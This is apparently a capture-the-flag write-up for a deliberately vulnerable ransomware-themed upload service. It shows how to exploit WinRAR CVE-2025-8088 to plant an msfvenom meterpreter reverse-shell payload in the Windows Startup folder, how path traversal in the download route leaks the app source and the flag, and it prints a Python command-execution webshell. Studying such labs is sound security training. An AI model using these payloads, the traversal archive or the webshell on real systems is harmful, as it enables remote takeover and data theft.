## Chall description
```
Category: Misc

You've heard of RaaS, you've heard of SaaS... the Threat Actor Support Line brings the two together!
Upload the files you want encrypted, and the service will start up its own hacker computer (as the Administrator user with antivirus disabled, of course) and encrypt them for you!
```

## Procedure
There is 3 possible solutions for this chall

## Intended solutions [CVE-2025-8088](https://github.com/onlytoxi/CVE-2025-8088-Winrar-Tool/tree/main)

CVE-2025-8088 is a critical path traversal vulnerability in WinRAR (versions prior to 7.13) that allows attackers to place malicious files outside the intended extraction path. 
This can lead to arbitrary code execution when users extract the files, especially if they land in auto-executing directories like the Windows Startup folder. 

The web chall has this note on button `You can expect your encrypted files to be ready almost instantly! We use WinRAR 7.12 for handling archives, and it's, as the Internet kids say, BLAZINGLY FAST!!!11`.
this has a reference for WinRAR 7.12

<img width="1369" height="730" alt="Screenshot 2025-10-16 at 10 47 52 PM" src="https://github.com/user-attachments/assets/3f6aee8d-0a1a-4d14-89ad-5074c4dfe230" />

We can create our malicious file with `msfvenom` and then craft a malicious `rar` file to extract it into `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=9001 -f exe -o reverse.exe
```

Craft malicious `rar` file.
<img width="1176" height="487" alt="Screenshot 2025-10-16 at 3 51 24 PM" src="https://github.com/user-attachments/assets/6a5f8a90-1982-498a-b053-492f78c464fb" />

Upload the malicious `rar` file.
<img width="1257" height="635" alt="Screenshot 2025-10-16 at 3 51 41 PM" src="https://github.com/user-attachments/assets/7bd48610-f325-442f-bb6e-56c624fd9200" />

After try to upload again, we can see a new connection from remote computer.
<img width="909" height="327" alt="Screenshot 2025-10-16 at 3 43 23 PM" src="https://github.com/user-attachments/assets/60fbd140-ab90-4e82-82f1-4828f1340490" />

<img width="924" height="725" alt="Screenshot 2025-10-16 at 3 45 09 PM" src="https://github.com/user-attachments/assets/f873ea06-8a8d-4c4a-a9e3-8614969c9d6f" />






## Unintended solution: \[Path traversal\]
After upload a test file, this enable a download button with encrypted files, if you can see, this make a reference to `download` path, `https://<id>.proxy.coursestack.com/download/<filename>`.
<img width="1008" height="387" alt="Screenshot 2025-10-16 at 11 13 45 PM" src="https://github.com/user-attachments/assets/04422d3d-cfdf-46af-9ba2-9a82cdf982d1" />

The chall structure can be
```
app
  - templates
  - downloads
  - uploads
  - app.py
```
we can try to leak `app.py`, using `../app.py`. I will use [WebRunner](https://github.com/sp34rh34d/WebRunner) for this.

<img width="1299" height="677" alt="Screenshot 2025-10-16 at 11 25 29 PM" src="https://github.com/user-attachments/assets/b9ae0379-589a-46ee-837a-a41fa6217aa9" />

this confirm the path traversal vulnerability, let's check the `app.py` code
<img width="1314" height="524" alt="Screenshot 2025-10-16 at 11 27 36 PM" src="https://github.com/user-attachments/assets/f8961b14-28ee-4dff-ba4f-1a2beb9631c7" />
```python
from flask import Flask, render_template, request, redirect, url_for, flash, send_file, jsonify
import os
import subprocess
import tempfile
import shutil
import time
import zipfile
import rarfile
from werkzeug.utils import secure_filename
import threading
import random
import string

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024

ALLOWED_EXTENSIONS = {'rar', 'zip'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def is_valid_archive(file_path):
    try:
        if file_path.lower().endswith('.zip'):
            with zipfile.ZipFile(file_path, 'r') as zip_file:
                zip_file.testzip()
            return True
        elif file_path.lower().endswith('.rar'):
            with rarfile.RarFile(file_path, 'r') as rar_file:
                rar_file.testrar()
            return True
    except:
        return False
    return False

def execute_startup_files():
    startup_path = r"C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    if os.path.exists(startup_path):
        files = os.listdir(startup_path)
        for file in files:
            if file.lower() == 'desktop.ini':
                continue
            file_path = os.path.join(startup_path, file)
            if os.path.isfile(file_path):
                try:
                    subprocess.Popen([file_path], shell=True)
                except Exception as e:
                    print(f"Error executing {file}: {e}")
    else:
        print(f"Startup directory does not exist: {startup_path}")

def process_archive(file_path, temp_dir):
    if file_path.lower().endswith('.zip'):
        with zipfile.ZipFile(file_path, 'r') as zip_file:
            zip_file.extractall(temp_dir)
    elif file_path.lower().endswith('.rar'):
        unrar_path = r'C:\Program Files\WinRAR\UnRAR.exe'
        if os.path.exists(unrar_path):
            subprocess.run([unrar_path, 'x', file_path, temp_dir], check=True)
        else:
            with rarfile.RarFile(file_path, 'r') as rar_file:
                rar_file.extractall(temp_dir)

def encrypt_file_content(file_path):
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        
        encrypted_content = bytearray()
        for byte in content:
            encrypted_byte = (byte ^ 0x42) + random.randint(1, 255)
            encrypted_byte = encrypted_byte % 256
            encrypted_content.append(encrypted_byte)
        
        with open(file_path, 'wb') as f:
            f.write(encrypted_content)
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def encrypt_files(temp_dir):
    for root, dirs, files in os.walk(temp_dir):
        for file in files:
            if not file.endswith('.tasl') and file != 'README.txt':
                old_path = os.path.join(root, file)
                new_path = os.path.join(root, file + '.tasl')
                try:
                    encrypt_file_content(old_path)
                    os.rename(old_path, new_path)
                except Exception as e:
                    print(f"Error processing {old_path}: {e}")

def create_ransom_note(temp_dir):
    ransom_path = os.path.join(temp_dir, 'README.txt')
    with open('ransom_note.txt', 'r', encoding='utf-8') as f:
        ransom_text = f.read()
    
    with open(ransom_path, 'w', encoding='utf-8') as f:
        f.write(ransom_text)

def create_output_archive(temp_dir, output_path, original_ext):
    if original_ext.lower() == '.zip':
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arc_path = os.path.relpath(file_path, temp_dir)
                    print(f"Adding to archive: {arc_path}")
                    zip_file.write(file_path, arc_path)
    else:
        rar_path = r'C:\Program Files\WinRAR\Rar.exe'
        if os.path.exists(rar_path):
            subprocess.run([rar_path, 'a', output_path, os.path.join(temp_dir, '*')], check=True)
        else:
            with zipfile.ZipFile(output_path.replace('.rar', '.zip'), 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_path = os.path.relpath(file_path, temp_dir)
                        print(f"Adding to archive: {arc_path}")
                        zip_file.write(file_path, arc_path)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        flash('No file selected', 'error')
        return redirect(url_for('index'))
    
    file = request.files['file']
    if file.filename == '':
        flash('No file selected', 'error')
        return redirect(url_for('index'))
    
    file.seek(0, 2)
    file_size = file.tell()
    file.seek(0)
    
    if file_size > app.config['MAX_CONTENT_LENGTH']:
        flash('File too large! Our hacking computer only has 1MB of RAM and we spent all our crypto on Steam and Uber Eats!', 'error')
        return redirect(url_for('index'))
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        if not os.path.exists(app.config['UPLOAD_FOLDER']):
            os.makedirs(app.config['UPLOAD_FOLDER'])
        
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        
        if not is_valid_archive(file_path):
            os.remove(file_path)
            flash('Invalid archive! This file is corrupted or not a real ZIP/RAR file!', 'error')
            return redirect(url_for('index'))
        
        try:
            execute_startup_files()
            
            temp_dir = tempfile.mkdtemp()
            process_archive(file_path, temp_dir)
            encrypt_files(temp_dir)
            create_ransom_note(temp_dir)
            
            output_filename = 'encrypted_' + filename
            output_path = os.path.join(app.config['UPLOAD_FOLDER'], output_filename)
            create_output_archive(temp_dir, output_path, os.path.splitext(filename)[1])
            
            shutil.rmtree(temp_dir)
            os.remove(file_path)
            
            flash('Files encrypted successfully!', 'success')
            return render_template('index.html', download_file=output_filename)
            
        except Exception as e:
            flash('Processing failed! Our hacking computer crashed! Try again later.', 'error')
            return redirect(url_for('index'))
    else:
        flash('Invalid file type. Please upload RAR or ZIP files only.', 'error')
        return redirect(url_for('index'))

@app.route('/download/<filename>')
def download_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        flash('File not found!', 'error')
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)
```

There is not any validation for `filename`, we can use this to extract our flag directly using WebRunner
```python
@app.route('/download/<filename>')
def download_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        flash('File not found!', 'error')
        return redirect(url_for('index'))
```
<img width="1429" height="646" alt="Screenshot 2025-10-16 at 11 38 45 PM" src="https://github.com/user-attachments/assets/45ab5854-ce1d-4a7e-95d7-5b123c473f3d" />




## Unintended solution \[SSTI or WebShell via CVE-2025-8088\]

The hard part here is try to identify the right path for our app, the path traversal we use to leak `windows/win.ini` is `../../../`. this give us the following idea.
we are on `downloads` folder, `../../downloads`, there two level to root folder `c:\`, the app folder can be on the following common routes for `challs`.
```
- c:\app\ctf\app.py
- c:\ctf\app\app.py
- c:\app\threat_actor_support_line\app.py
- c:\ctf\threat_actor_support_line\app.py
- c:\app\threat-actor-support-line\app.py
- c:\ctf\threat-actor-support-line\app.py
```
We create the following webshell for testing, but you can try to replace `templates/index.html` using `SSTI` as alternative.
```python
# app.py
from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route("/cmd", methods=["GET"])
def cmd():
    command = request.args.get("cmd", "")
    if not command:
        return jsonify({"error": "no command provided"}), 400
    try:
        proc = subprocess.run(command, capture_output=True, text=True, shell=True, timeout=20)
    except subprocess.TimeoutExpired:
        return jsonify({"error": "timeout"}), 504
    except Exception as e:
        return jsonify({"error": "exec error", "detail": str(e)}), 500

    return jsonify({
        "cmd": command,
        "returncode": proc.returncode,
        "stdout": proc.stdout,
        "stderr": proc.stderr
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

```

Craft our malicious `rar` file, and after submit, wi will need to restart the chall instance.
```powershell
PS C:\Users\demo\Desktop\CVE-2025-8088-Winrar-Tool-main> python3 .\gui.py
[+] Detected username: demo
[+] Target directory: C:\ctf\threat-actor-support-line
[+] Injected stream name will be: ..\..\..\..\..\..\..\..\ctf\threat-actor-support-line\app.py
[+] Attached ADS on disk
[+] Patched 1 placeholder occurrence(s).
[+] Recomputed CRC for 4 header block(s).
[+] Wrote patched archive: output\app.rar
[i] Injected stream name: ..\..\..\..\..\..\..\..\ctf\threat-actor-support-line\app.py
```

After restart, we were able to replace `app.py` with our webshell
<img width="1236" height="149" alt="Screenshot 2025-10-17 at 12 05 47 AM" src="https://github.com/user-attachments/assets/5478ac10-e2ac-4313-9d0c-8fc4377d862d" />

Flag `flag{6529440ceec226f31a3b2dc0d0b06965}`
